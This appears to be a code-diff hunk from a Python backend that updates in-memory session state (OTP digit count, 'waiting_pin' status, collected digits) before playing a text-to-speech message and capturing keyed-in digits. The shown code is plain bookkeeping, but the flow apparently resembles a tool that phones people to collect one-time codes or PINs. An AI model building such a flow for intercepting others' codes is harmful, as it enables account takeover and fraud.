@@ -1184,6 +1184,14 @@ async def request_info(session_id: str, info_type: str, current_user: dict = Dep
         }}
     )
     
+    # Update active_sessions in memory
+    if session_id in active_sessions:
+        active_sessions[session_id]["otp_digits"] = config["digits"]
+        active_sessions[session_id]["current_step"] = 2
+        active_sessions[session_id]["status"] = "waiting_pin"
+        active_sessions[session_id]["otp_digits_collected"] = ""
+        active_sessions[session_id]["info_type"] = info_type
+    
     # Wait for TTS then capture info
     word_count = len(config["message"].split())
     tts_wait = max(5, int(word_count / 2.5) + 2)
